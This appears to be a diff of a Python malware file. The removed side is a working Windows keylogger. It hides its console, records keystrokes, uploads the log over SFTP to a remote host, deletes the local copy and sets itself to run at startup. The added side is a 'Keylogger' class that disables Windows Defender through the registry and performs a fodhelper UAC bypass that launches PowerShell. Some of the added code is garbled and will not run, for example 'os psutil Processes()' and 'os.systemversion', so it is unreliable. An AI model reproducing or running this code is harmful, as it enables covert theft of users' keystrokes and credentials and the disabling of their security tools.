@@ -1,73 +1,151 @@
-import win32api
-import win32console
-import win32gui
-import pythoncom
-import pyHook
-import paramiko
+import subprocess
+import time
+import winreg
 import os
-import winreg as reg
+import schedule
+from psutil import *
+import logging
+import platform
+import winsound
 
-# Ẩn cửa sổ console
-win = win32console.GetConsoleWindow()
-win32gui.ShowWindow(win, 0)
+# Configure logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s',
+    filename='keylogger_and_bypass.py.log',
+    filemode='w'
+)
+logger = logging.getLogger(__name__)
 
-log_file = 'C:\\path_to_save_log\\log.txt'  # Đường dẫn đến file log trên máy Windows
+class Keylogger:
+    def __init__(self):
+        self.check_log_files()
+        self.start_timer()
 
-# Hàm xử lý sự kiện bàn phím
-def OnKeyboardEvent(event):
-    with open(log_file, 'a') as f:
-        f.write(chr(event.Ascii))
-    return True
+    def check_log_files(self):
+        # Create default log files if they don't exist
+        os.makedirs('logs', exist_ok=True)
+        for log in ['system_info.log', 'process_activity.log']:
+            open(f'logs/{log}', 'a').close()
 
-# Đăng ký hàm xử lý với HookManager
-hm = pyHook.HookManager()
-hm.KeyDown = OnKeyboardEvent
-hm.HookKeyboard()
+    def start_timer(self):
+        self.timer = schedule.Timer(60.0, self.run_logger).start()
 
-def send_file_to_linux(local_file_path, remote_file_path, linux_ip, linux_username, linux_password):
+    def run_logger(self):
+        try:
+            while True:
+                time.sleep(1)
+                
+                # System Information
+                self.log_system_info()
+                
+                # Process Activity
+                self.log_process_activity()
+                
+                # Bypass monitoring and logging
+                disable_windows_defender()
+                fodhelper_bypass()
+                
+                # Check if FodHelper is still active (optional)
+                check_fodhelper_activity()
+        except Exception as e:
+            logger.error(f"Error during keylogging: {e}")
+
+    def log_system_info(self):
+        try:
+            system_info = {
+                'Date': time.strftime("%Y-%m-%d %H:%M:%S"),
+                'SystemVersion': os.systemversion,
+                'PythonVersion': platform.python_version(),
+                'PythonPlatform': platform.platform()
+            }
+            self.log_to_file(system_info)
+        except Exception as e:
+            logger.error(f"Error logging system info: {e}")
+
+    def log_process_activity(self):
+        try:
+            processes = list(p for p in os psutil Processes() if p.is_running())
+            process_activity_log = {
+                'Processes': [p.name() for p in processes],
+                'States': [p.status() for p in processes]
+            }
+            self.log_to_file(process_activity_log)
+        except Exception as e:
+            logger.error(f"Error logging process activity: {e}")
+
+    def log_to_file(self, data):
+        try:
+            file_path = os.path.join('logs', f'system_info.log')
+            with open(file_path, 'a') as f:
+                datetime = time.strftime("%Y-%m-%d %H:%M:%S")
+                for key in sorted(data.keys()):
+                    line = f"{datetime} - {key}: {data[key]}\n"
+                    f.write(line)
+        except Exception as e:
+            logger.error(f"Error writing to log file: {e}")
+
+    def enable_logging(self, program):
+        """Enable logging when a specific program is running."""
+        try:
+            process = subprocess.run(
+                [program],
+                capture_output=True,
+                text=True,
+                shell=True,
+                check_closing=False
+            )
+            os.environ['LOG'] = f"{os.getpid()}"
+            self.log_to_file({"Program": program, "ExitCode": process.returncode})
+        except Exception as e:
+            logger.error(f"Error enabling logging: {e}")
+
+    def disable_logging(self):
+        """Disable logging when logging is enabled."""
+        os.environ['LOG'] = ""
+
+def disable_windows_defender():
+    key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
     try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(linux_ip, username=linux_username, password=linux_password)
-
-        sftp = ssh.open_sftp()
-        sftp.put(local_file_path, remote_file_path)
-        sftp.close()
-        ssh.close()
-
-        # Xóa file log sau khi chuyển
-        os.remove(local_file_path)
+        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
+            winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
     except Exception as e:
-        print(f"Error occurred: {e}")
+        logger.error(f"Error disabling Windows Defender: {e}")
 
-# Gửi file log mỗi lần sau khi viết đủ 100 ký tự
-def check_and_send_log():
-    if os.path.exists(log_file) and os.path.getsize(log_file) >= 100:
-        send_file_to_linux(log_file, '/home/user/log.txt', '192.168.x.x', 'your_linux_username', 'your_linux_password')
-
-# Thêm chương trình vào startup thông qua Registry
-def add_to_startup(script_path):
-    key = reg.HKEY_CURRENT_USER
-    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
-
-    # Mở khóa Run, nếu không tồn tại thì tạo mới
+def fodhelper_bypass(program="cmd /c start powershell.exe"):
+    # Create registry structure
     try:
-        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+        key_path = r"Software\Classes\ms-settings\Shell\Open\command"
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
+            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program)
+    except Exception as e:
+        logger.error(f"Error creating registry structure: {e}")
+        return
+
+    # Perform the bypass
+    try:
+        subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
+    except Exception as e:
+        logger.error(f"Error starting fodhelper.exe: {e}")
+        return
+
+    # Remove registry structure after use
+    time.sleep(3)
+    try:
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")
     except FileNotFoundError:
-        # Tạo thư mục nếu nó không tồn tại
-        open_key = reg.CreateKey(key, key_value)
+        pass  # Registry structure already removed or not found
+    except Exception as e:
+        logger.error(f"Error removing registry structure: {e}")
 
-    # Thêm giá trị mới
-    reg.SetValueEx(open_key, "MyKeylogger", 0, reg.REG_SZ, script_path)
-    reg.CloseKey(open_key)
-
-
-if __name__ == '__main__':
-    # Thiết lập để chương trình tự động chạy khi khởi động
-    script_path = os.path.realpath(__file__)
-    add_to_startup(script_path)
-
-    # Chạy keylogger
-    while True:
-        pythoncom.PumpWaitingMessages()
-        check_and_send_log()
+def check_fodhelper_activity():
+    try:
+        key_path = r"HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command\fodhelper"
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path) as key:
+            if winreg.QueryValueEx(key, "DelegateExecute") == "":
+                logger.info("FodHelper is active and running.")
+            else:
+                logger.warning("FodHelper may have been disabled or removed.")
+    except Exception as e:
+        logger.error(f"Error checking FodHelper activity: {e}")
